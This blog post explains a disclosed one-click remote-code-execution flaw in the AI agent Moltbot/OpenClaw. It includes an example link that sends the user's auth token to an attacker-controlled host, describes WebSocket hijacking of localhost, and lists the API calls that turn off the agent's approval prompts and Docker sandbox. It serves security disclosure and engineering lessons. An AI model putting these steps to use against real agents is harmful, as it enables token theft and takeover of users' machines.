---
layout: post
title: "Moltbot's 1-Click RCE: When You Give AI Agents God Mode"
date: 2026-02-02 00:30:00 +0800
categories: [AI, Engineering]
lang: en
ref: moltbot-rce-god-mode-risks
image: /img/posts/moltbot-rce.webp
---

There's a thread on Hacker News that's been blowing up — 135 points and 59 comments. A security firm called depthfirst just disclosed a critical vulnerability in Moltbot (now renamed OpenClaw): a single malicious link could let an attacker steal your auth token, disable all safety guardrails, and execute arbitrary commands on your machine.

This isn't some exotic zero-day. The vulnerability itself isn't even particularly complex. But it reveals a much bigger problem: **when we start handing control of our computers to AI agents, the security playbook we've been using doesn't work anymore.**

## The Vulnerability Is Actually Pretty Simple

This RCE is a chain of three seemingly harmless design decisions:

1. **URL parameters can change the Gateway URL**  
   Moltbot's settings allow you to change the gateway location via a URL parameter `?gatewayUrl=`, and it gets saved to localStorage immediately. Nothing wrong with that — lots of apps do this.

2. **Changing settings triggers auto-connect**  
   Once you change the `gatewayUrl`, the app automatically tries to connect to the new gateway without asking. Still reasonable — manually reconnecting every time you switch environments would be annoying.

3. **Connections include the auth token**  
   The WebSocket handshake automatically includes your authentication token. Standard practice — otherwise how would the gateway know who you are?

Now chain these three "reasonable designs" together: An attacker sends you a link like `http://your-moltbot.com?gatewayUrl=ws://attacker.com:8080`. You click it, the app auto-connects to the attacker's fake gateway, and your auth token gets handed over.

That's just step one.

## localhost Isn't Safe Either

Most people run Moltbot on localhost, which should theoretically be unreachable from the outside. But the attacker found another issue: **Moltbot's WebSocket server doesn't validate the Origin header**.

This means that just by visiting the attacker's website `attacker.com`, they can run JavaScript in your browser that opens a WebSocket connection to `ws://localhost:18789`, then logs in to your local Moltbot using the stolen token.

It's called Cross-Site WebSocket Hijacking (CSWSH). Not a new trick, but effective.

## The Real Kicker: Disabling Safety Features

Moltbot has two layers of protection:
- `exec-approvals.json` prompts you before running dangerous commands
- You can choose to run commands inside a Docker container

But these protections are all controlled via the API. And the stolen token has `operator.admin` and `operator.approvals` scopes, so the attacker can:

1. Send an `exec.approvals.set` request to set `ask` to `"off"`  
2. Send a `config.patch` request to change `tools.exec.host` to `"gateway"`

Now even Docker is gone. Straight execution on your host:

```text
node.invoke -> system.run -> bash -c 'echo hacked > /tmp/hacked'
```

Done.

## This Isn't Just a Bug

At this point you might be thinking: "Okay, so they fixed it. What's the big deal?"

True, the OpenClaw team patched the vulnerability by adding a gateway URL confirmation modal. Problem solved, right?

Technically, yes. But this incident exposes something deeper.

### Agents Have Too Much Permission

What can Moltbot do? Read your iMessage, WhatsApp, Slack. Access your Stripe API keys. Run arbitrary commands on your computer. This isn't a bug — this is by design.

Why? Because it's a "personal AI assistant." It needs these permissions to actually help you. The problem is: when an application has this much power, your attack surface becomes massive. Traditional app vulnerabilities might leak data at worst, but agent vulnerabilities can let attackers **do anything you can do**.

### Fast Iteration vs Security Audits

Moltbot is an open-source project, community-driven, iterating fast. That's great — open source should work that way. But the question is: how many people are reviewing security?

depthfirst used automated tools to find this vulnerability. Their tools can "trace data flows," connecting logic scattered across different files to find these "safe in isolation, dangerous when combined" patterns.

Could this be done manually? Sure, but it's time-consuming. And community projects typically don't have resources for deep security audits. So we need tools. The question is: how many people will actually use them?

### A Warning for Engineers

Every step of this vulnerability is "common practice":
- URL parameters changing settings ✓
- Auto-connect after config change ✓  
- WebSocket carrying auth tokens ✓

But combine them and you get 1-Click RCE.

What's the lesson for us writing code? **Individual feature security isn't enough — you need to see the whole system's data flow.**

This is hard. Because modern applications are inherently fragmented, with lots of async, event-driven logic. You can't see the full picture from a single file. That's why tools like depthfirst have value: they can show you what you can't see.

But it also means: if you don't use tools, you might never know your code has these issues.

## Will I Keep Using Moltbot?

Yes, but more carefully.

This vulnerability was discovered, disclosed, and patched. The whole process was healthy. The depthfirst team did responsible disclosure, and the OpenClaw team responded quickly. This is how open source communities should work.

But I'll remember one thing: **when you give an AI agent god mode permissions, you need to make sure that god can't be hijacked.**

Most current agent frameworks are still in the "get it working first" phase. Security isn't the top priority. That's understandable — even basic functionality is still being figured out. But as more people hand sensitive data to agents, this problem will have to be addressed.

I'm not sure what the answer is. Maybe stricter permission controls, better sandboxing, more automated audit tools — or all three.

But at least now we know where the problem is. That's the first step.

---

## References

- [1-Click RCE to steal your Moltbot data and keys - depthfirst](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys)
- [OpenClaw GitHub Security Advisory GHSA-g8p2-7wf7-98mq](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)
- [Hacker News discussion thread](https://news.ycombinator.com/item?id=46848769)
